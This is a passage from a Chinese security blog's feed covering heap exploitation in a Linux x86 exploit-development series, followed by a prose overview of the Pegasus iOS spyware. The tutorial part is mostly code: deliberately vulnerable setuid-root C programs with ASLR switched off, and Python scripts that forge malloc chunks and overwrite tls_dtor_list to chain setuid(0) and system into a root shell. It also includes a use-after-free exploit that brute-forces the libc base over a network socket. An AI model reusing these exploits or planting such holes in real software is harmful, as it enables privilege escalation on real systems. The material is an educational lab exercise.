class="number">724</span> (<span class="number">0x80483a0</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="Off-By-One-漏洞（基于堆）"><a href="#Off-By-One-漏洞（基于堆）" class="headerlink" title="Off-By-One 漏洞（基于堆）"></a>Off-By-One 漏洞（基于堆）</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>将源字符串复制到目标缓冲区可能造成 <code>Off-By-One</code> 漏洞，当源字符串的长度等于目标缓冲区长度的时候。当源字符串的长度等于目标缓冲区长度的时候，单个 <code>NULL 字符</code>会复制到目标缓冲区的上方。因此由于目标缓冲区位于堆上，<code>单个 NULL 字节</code>会覆盖下一个块的块头部，并且这会导致任意代码执行。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//consolidate_forward.c  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;      </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> SIZE 16     </span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"> <span class="keyword">int</span> fd = open(<span class="string">"./inp_file"</span>, O_RDONLY); <span class="comment">/* [1] */</span>  </span><br><span class="line"> <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"File open error\n"</span>);  </span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line"> &#125;     </span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">1020</span>) &#123; <span class="comment">/* [2] */</span>  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Buffer Overflow Attempt. Exiting...\n"</span>);  </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">-2</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">char</span>* tmp = <span class="built_in">malloc</span>(<span class="number">20</span><span class="number">-4</span>); <span class="comment">/* [3] */</span>  </span><br><span class="line">    <span class="keyword">char</span>* p = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [4] */</span>  </span><br><span class="line">    <span class="keyword">char</span>* p2 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [5] */</span>  </span><br><span class="line">    <span class="keyword">char</span>* p3 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [6] */</span>     </span><br><span class="line">    read(fd,tmp,SIZE); <span class="comment">/* [7] */</span>  </span><br><span class="line">    <span class="built_in">strcpy</span>(p2,argv[<span class="number">1</span>]); <span class="comment">/* [8] */</span>     </span><br><span class="line">    <span class="built_in">free</span>(p); <span class="comment">/* [9] */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -o consolidate_forward consolidate_forward.c  </span><br><span class="line">$sudo chown root consolidate_forward  </span><br><span class="line">$sudo chgrp root consolidate_forward  </span><br><span class="line">$sudo chmod +s consolidate_forward</span><br></pre></td></tr></table></figure><p>上述漏洞代码的行[2]和[8]是基于<code>堆</code>的 <code>off-by-one</code> 溢出发生的地方。<code>目标缓冲区</code>的长度是 <code>1020</code>，因此长度为 1020 的源字符串可能导致任意代码执行。</p><p><code>unlink</code>一个已经处于分配状态的块，会导致任意代码执行，因为任何四个字节的内存区域都能被攻击者的数据覆盖。但是在同一篇文章中，我们也看到，<code>unlink</code> 技巧已经废弃，因为 <code>glibc</code> 近几年来变得更加可靠。具体来说，因为<code>双向链表损坏</code>的条件，任意代码执行时不可能的。但是，Google 的 Project Zero 小组找到了一种方式，来成功绕过<code>双向链表损坏</code>的条件，通过 <code>unlink large</code> 块。</p><p>在 <code>glibc malloc</code> 中，主要的<code>环形双向链表</code>由<code>malloc_chunk</code>的<code>fd</code>和<code>bk</code>字段维护，而次要的<code>环形双向链表</code>由<code>malloc_chunk</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>字段维护。双向链表的加固看起来用在主要（行[1]）和次要（行[4]和[5]）的双向链表上，但是次要的环形双向链表的加固，只是个调试断言语句（不像主要双向链表加固那样，是运行时检查），它在<code>生产构建中没有被编译</code>（至少在 <code>fedora x86</code>中）。因此，次要的环形双向链表的加固（行[4]和[5]）并不重要，这让我们能够向<code>任意 4 个字节的内存区域</code>写入任何数据。所以现在攻击者需要覆盖要被释放的 <code>large 块的malloc_chunk元素</code>。</p><p><strong>利用代码：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp_try.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">fd = <span class="number">0xb7ff9712</span>  </span><br><span class="line">bk = <span class="number">0xb7f861b4</span>  </span><br><span class="line">fd_nextsize = <span class="number">0xb7f86157</span>  </span><br><span class="line">bk_nextsize = <span class="number">0x804b430</span>  </span><br><span class="line">system = <span class="number">0xb7e5d0b0</span>  </span><br><span class="line">sh = <span class="number">0xb7f816a0</span>  </span><br><span class="line">     <span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line">buf = conv(fd)  </span><br><span class="line">buf += conv(bk)  </span><br><span class="line">buf += conv(fd_nextsize)  </span><br><span class="line">buf += conv(bk_nextsize)  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(sh)  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">996</span>     </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</span><br></pre></td></tr></table></figure><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu25.png" title="图25"><p>执行上述利用代码不会向我们提供 <code>root shell</code>。它向我们提供了一个运行在我们的权限级别的 <code>bash shell</code></p><p>当<code>uid != euid</code>时，<code>/bin/bash</code>会丢弃权限。我们的二进制<code>前向合并</code>的真实<code>uid 是 1000</code>，但是它的<code>有效 uid</code>是 0。因此当<code>system调用</code>时，<code>bash 会丢弃权限</code>，因为<code>真实 uid</code>不等于<code>有效 uid</code>。为了解决这个问题，我们需要在s<code>ystem之前调用setuid(0)</code>，因为<code>_call_tls_dtors()</code>依次遍历<code>tls_dtor_list</code>，我们需要将<code>setuid</code>和<code>system</code>链接，以便获得<code>root shell</code>。</p><p><strong>完整利用代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gen_file.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="comment">#dtor_list  </span></span><br><span class="line">setuid = <span class="number">0x4e123e30</span>  </span><br><span class="line">setuid_arg = <span class="number">0x0</span>  </span><br><span class="line">mp = <span class="number">0x804b020</span>  </span><br><span class="line">nxt = <span class="number">0x804b430</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">      <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line">tst = conv(setuid)  </span><br><span class="line">tst += conv(setuid_arg)  </span><br><span class="line">tst += conv(mp)  </span><br><span class="line">tst += conv(nxt)  </span><br><span class="line"><span class="keyword">print</span> tst</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">fd = <span class="number">0x0804b418</span>  </span><br><span class="line">bk = <span class="number">0x0804b418</span>  </span><br><span class="line">fd_nextsize = <span class="number">0xb7fe86c0</span>  </span><br><span class="line">bk_nextsize = <span class="number">0x804b008</span>  </span><br><span class="line">system = <span class="number">0x4e0a86e0</span>  </span><br><span class="line">sh = <span class="number">0x80482ce</span>     </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line">buf = conv(fd)  </span><br><span class="line">buf += conv(fd_nextsize)  </span><br><span class="line">buf += conv(bk_nextsize)  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(sh)  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">996</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</span><br></pre></td></tr></table></figure><p>执行上述利用代码会给我们 <code>root shell</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu26.png" title="图26"><hr><h2 id="释放后使用"><a href="#释放后使用" class="headerlink" title="释放后使用"></a>释放后使用</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>继续使用已经<code>被释放的堆内存指针</code>叫做<code>释放后使用</code>。这个漏洞会导致任意代码执行。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BUFSIZE1 1020  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 4)      </span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv)</span> </span>&#123;      </span><br><span class="line"> <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [1] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* details = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [2] */</span>  </span><br><span class="line"> <span class="built_in">strncpy</span>(name, argv[<span class="number">1</span>], <span class="number">12</span><span class="number">-1</span>); <span class="comment">/* [3] */</span>  </span><br><span class="line"> <span class="built_in">free</span>(details); <span class="comment">/* [4] */</span>  </span><br><span class="line"> <span class="built_in">free</span>(name);  <span class="comment">/* [5] */</span>  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>,name); <span class="comment">/* [6] */</span>  </span><br><span class="line"> fflush(<span class="built_in">stdout</span>);     </span><br><span class="line"> <span class="keyword">char</span>* tmp = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [7] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [8] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [9] */</span>  </span><br><span class="line"> <span class="built_in">free</span>(p2); <span class="comment">/* [10] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p2_1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [11] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p2_2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [12] */</span>     </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Enter your region\n"</span>);  </span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  </span><br><span class="line"> read(<span class="number">0</span>,p2,BUFSIZE1<span class="number">-1</span>); <span class="comment">/* [13] */</span>  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Region:%s\n"</span>,p2);   </span><br><span class="line"> <span class="built_in">free</span>(p1); <span class="comment">/* [14] */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>不像上一篇文章，<code>ASLR</code> 在这里是打开的。所以现在让我们利用 <code>UAF 漏洞</code>，因为 <code>ASLR</code>打开了，让我们使用信息泄露和爆破技巧来绕过它。上面的漏洞代码包含<code>两个 UAF 漏洞</code>，位于行[6]和[13]。它们的堆内存在行[5]和[10]释放，但是它们的指针即使在释放后也使用，在行[6]和[13]。行[6]的<code>UAF</code> 会导致信息泄露，而行[13]的 <code>UAF</code> 导致任意代码执行。</p><blockquote><p>• 行[1]为<code>name</code>分配了 16 字节的堆内存区域。</p><p>• 行[2]位<code>details</code>分配了 16 字节的堆内存区域。</p><p>• 行[3]将程序的参数<code>1（argv[1]）</code>复制到堆内存区域<code>name</code>中。</p><p>• 行[4]和[5]将堆内存区域<code>name</code>和<code>details</code>释放给 <code>glibc malloc</code>。</p><p>• 行[6]的<code>printf</code>在释放后使用<code>name指针</code>，这会导致堆地址的泄露。</p><p>• 行[7]为<code>tmp</code>分配了 16 字节的堆内存区域。</p><p>• 行[8]为<code>p1</code>分配了 1024 字节的堆内存区域。</p><p>• 行[9]为<code>p2</code>分配了 1024 字节的堆内存区域。</p><p>• 行[10]将堆内存区域<code>p2</code>释放给 <code>glibc malloc</code>。</p><p>• 行[11]为<code>p2_1</code>分配了 512 字节的堆内存区域。</p><p>• 行[12]为<code>p2_2</code>分配了 512 字节的堆内存区域。</p><p>• 行[13]的读取在释放后使用了<code>p2</code>指针。</p><p>• 行[14]将堆内存区域<code>p1</code>释放给 <code>glibc malloc</code>。这会在程序退出时导致任意代码执行。</p></blockquote><p><strong>利用代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct* </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> telnetlib  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">ip = <span class="string">'127.0.0.1'</span>  </span><br><span class="line">port = <span class="number">1234</span>  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(data)</span>:</span>  </span><br><span class="line"><span class="keyword">global</span> con  </span><br><span class="line">con.write(data)  </span><br><span class="line"><span class="keyword">return</span> con.read_until(<span class="string">'\n'</span>)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">" Bruteforcing libc base address"</span>  </span><br><span class="line">libc_base_addr = <span class="number">0xb756a000</span>  </span><br><span class="line">fd_nextsize = (libc_base_addr - <span class="number">0x1000</span>) + <span class="number">0x6c0</span>  </span><br><span class="line">system = libc_base_addr + <span class="number">0x3e6e0</span>  </span><br><span class="line">system_arg = <span class="number">0x80482ae</span>  </span><br><span class="line">size = <span class="number">0x200</span>  </span><br><span class="line">setuid = libc_base_addr + <span class="number">0xb9e30</span>  </span><br><span class="line">setuid_arg = <span class="number">0x0</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">  time.sleep(<span class="number">4</span>)  </span><br><span class="line">  con = telnetlib.Telnet(ip, port)  </span><br><span class="line">  laddress = con.read_until(<span class="string">'\n'</span>)  </span><br><span class="line">  laddress = laddress[<span class="number">8</span>:<span class="number">12</span>]  </span><br><span class="line">  heap_addr_tup = truct.unpack(<span class="string">"&lt;I"</span>, laddress)  </span><br><span class="line">  heap_addr = heap_addr_tup[<span class="number">0</span>]  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">" Leaked heap addresses : [0x%x] "</span> %(heap_addr)  </span><br><span class="line">  heap_base_addr = heap_addr - <span class="number">0x10</span>  </span><br><span class="line">  fd = heap_base_addr + <span class="number">0x410</span>  </span><br><span class="line">  bk = fd  </span><br><span class="line">  bk_nextsize = heap_base_addr + <span class="number">0x618</span>  </span><br><span class="line">  mp = heap_base_addr + <span class="number">0x18</span>  </span><br><span class="line">  nxt = heap_base_addr + <span class="number">0x428</span>  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">" Constructing fake chunk to overwrite tls_dtor_list"</span>  </span><br><span class="line">  fake_chunk = conv(fd)  </span><br><span class="line">  fake_chunk += conv(bk)  </span><br><span class="line">  fake_chunk += conv(fd_nextsize)  </span><br><span class="line">  fake_chunk += conv(bk_nextsize)  </span><br><span class="line">  fake_chunk += conv(system)  </span><br><span class="line">  fake_chunk += conv(system_arg)  </span><br><span class="line">  fake_chunk += <span class="string">"A"</span> * <span class="number">484</span>  </span><br><span class="line">  fake_chunk += conv(size)  </span><br><span class="line">  fake_chunk += conv(setuid)  </span><br><span class="line">  fake_chunk += conv(setuid_arg)  </span><br><span class="line">  fake_chunk += conv(mp)  </span><br><span class="line">  fake_chunk += conv(nxt)  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">" Successful tls_dtor_list overwrite gives us shell!!"</span>  </span><br><span class="line">  send(fake_chunk)  </span><br><span class="line">  <span class="keyword">try</span>:   </span><br><span class="line">    con.interact()  </span><br><span class="line">    <span class="keyword">except</span>:   </span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>由于在爆破技巧中，我们需要<code>尝试多次</code>（直到成功）。让我们将我们的漏洞二进制<code>test</code>运行为网络服务器，并使用 <code>Shell</code> 教程来确保崩溃时自动重启：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#test.sh  </span></span><br><span class="line">#!/bin/sh  </span><br><span class="line">nc_process_id=$(pidof nc)  </span><br><span class="line"><span class="keyword">while</span> :  </span><br><span class="line"><span class="keyword">do</span>  </span><br><span class="line"> <span class="keyword">if</span> [[ -z $nc_process_id ]]; then  </span><br><span class="line">    echo <span class="string">"(Re)starting nc..."</span>  </span><br><span class="line">    nc -l -p <span class="number">1234</span> -c <span class="string">"./test sploitfun"</span>  </span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line">    echo <span class="string">"nc is running..."</span>  </span><br><span class="line">    fi  </span><br><span class="line">    done</span><br></pre></td></tr></table></figure><p>但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="Linux (x86) Exploit 开发系列教程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="Linux开发" scheme="http://yoursite.com/tags/Linux%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ios间谍软件Pegasus</title>
    <link href="http://yoursite.com/2019/07/20/ios%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6Pegasus/"/>
    <id>http://yoursite.com/2019/07/20/ios间谍软件Pegasus/</id>
    <published>2019-07-20T08:24:48.000Z</published>
    <updated>2019-07-26T08:16:54.865Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>它是通过点击一个链接来触发攻击，用户点击短信内的链接后，攻击者就会利用3个0day漏洞。所以可以推测，链接的作用就是在后台静默的下载payload，以及木马所需要的各种环境。然后安装间谍软件，随后就能对设备进行全面控制，还能获取设备中的数据，通过麦克风监听对话，跟踪即时通讯应用的对话内容等</p></blockquote><p>通过查询各种资料，将攻击总结为3个阶段。</p><h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a><strong>第一阶段</strong></h2><p><strong>传送并利用<code>WebKit</code>漏洞</strong>，通过HTML文件利用<code>WebKit</code>中的<code>CVE-2016-4655</code>漏洞</p><h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a><strong>第二阶段</strong></h2><p><strong>越狱</strong>。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对 ios 内核两个漏洞(<code>CVE-2016-4656</code>和<code>CVE-2016-4657</code>)的exp还有一个用来下载解密第三阶段软件包的loader。同时，第二阶段结束时，exp会移除<code>/etc/nfs.conf</code>，然后加载<code>/sbin/mount_nfs</code>。为了在重启之后依然留在系统中，Pegasus会把系统守护进程<code>rtbuddyd</code>替换成一个<code>jsc</code>二进制文件，并且创建一个链接到<code>ascript</code>。</p><h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a><strong>第三阶段</strong></h2><p><strong>安装间谍软件</strong>。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把<code>hook</code>安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如<code>ssh</code>。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。同时，软件会运行一个<code>lw-install</code>二进制文件，这个文件包含很多关键架构，并且能在用户重启之后仍然驻足系统，良心的是其中还有一些保护功能，防止用户手机变砖。</p><p><code>lw-install</code>首先会检查 ios 版本，对于不同的版本，<code>lw-install</code>会执行不同的命令。</p><p>第三阶段中，间谍会部署一个<code>test222.tar</code>文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的<code>根TLS证书</code>、针对<code>Viber</code>、<code>Whatsapp</code>的嗅探库、专门用于通话录音的库等。</p><blockquote><p>Pegasus有很多保证私密的功能，他会经常检查手机有没有被其他软件越狱，甚至还包含一个复杂的自毁机制，禁止更新机制，提权机制，检测其他越狱软件等机制。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="IOS间谍软件" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/IOS%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="ios漏洞" scheme="http://yoursite.com/tags/ios%E6%BC%8F%E6%B4%9E/"/>
    
